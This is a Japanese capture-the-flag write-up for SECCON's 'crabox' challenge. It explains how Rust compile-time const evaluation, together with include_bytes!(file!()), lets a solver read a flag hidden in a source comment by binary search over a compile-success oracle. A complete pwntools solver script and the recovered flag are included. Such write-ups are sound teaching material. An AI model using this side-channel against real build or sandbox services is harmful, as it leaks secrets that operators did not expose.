# crabox

## 概要

Rustのソースコードを送信すると、コンパイルに成功するか否かが返ります。
FLAGはコンパイルされるプログラムの末尾に、コメントとして記載されています。

```rust
TEMPLATE = """
fn main() {
    {{YOUR_PROGRAM}}

    /* Steal me: {{FLAG}} */
}
""".strip()
```

## 観察

### const

const で変数定義をすると、コンパイル時に評価して代入してくれるようです。

```rust
fn main() {
    const b: bool = false;
    const r: u8 = 1 / (b as u8);
}
```

上記コードを実行すると、ゼロ除算のエラーが**コンパイル時に**発生します。

```text
error[E0080]: evaluation of constant value failed
 --> main.rs:3:19
  |
3 |     const r: u8 = 1 / (b as u8);
  |                   ^^^^^^^^^^^^^ attempt to divide `1_u8` by zero
```

### マクロ

ソースコードの情報をboolに落とし込むために、使えそうなマクロを探しました。
参考：[Rustの便利マクロ特集](https://qiita.com/elipmoc101/items/f76a47385b2669ec6db3)

以下をコンパイルして実行すると、ソースコードそのものが表示されました。
この情報は使えそうです。

```rust
fn main() {
    const f: &str = include_str!(file!());
    println!("{}", f);
    /* Steal me: {{FLAG}} */
}
```

str型だとコンパイル時の比較処理をうまく扱えなかったので、最終的には `include_bytes!` を使用することにしました。

## 解法

以下のプログラムを実行してFLAGを獲得しました。

```python
from pwn import *

TEMPLATE = """
const f: &[u8; {{LENGTH}}] = include_bytes!(file!());
const b: bool = f[{{INDEX}}] >= {{VALUE}};
const r: u8 = 1 / (b as u8);
"""


def is_compilable(program):
    io = remote("crabox.seccon.games", "1337")
    io.sendline(program.encode())
    io.sendline(b"__EOF__")
    res = io.recvall()
    io.close()
    return b":)" in res


def generate_program(length, index, value):
    program = TEMPLATE
    program = program.replace("{{LENGTH}}", f"{length:03}")
    program = program.replace("{{INDEX}}", f"{index:03}")
    program = program.replace("{{VALUE}}", f"{value:03}")
    return program


# check the overall length of the program
length = len(TEMPLATE)
while True:
    program = generate_program(length, 0, 0)
    if is_compilable(program):
        break
    length += 1
print(f"{length = }")  # length = 173


# check the starting potision of the FLAG
for start in range(length - 1, -1, -1):
    program = generate_program(length, start, ord("S"))
    program = program.replace(">=", "==")
    if is_compilable(program):
        break
print(f"{start = }")  # start = 144

# determine each character of the FLAG
flag = "SECCON{"
while flag[-1] != "}":
    ok = 32
    ng = 128
    while ng - ok > 1:
        x = (ok + ng) // 2
        program = generate_program(length, start + len(flag), x)
        if is_compilable(program):
            ok = x
        else:
            ng = x
    flag += chr(ok)
    print(f"OK: {flag}")
# SECCON{ctfe_i5_p0w3rful}
```
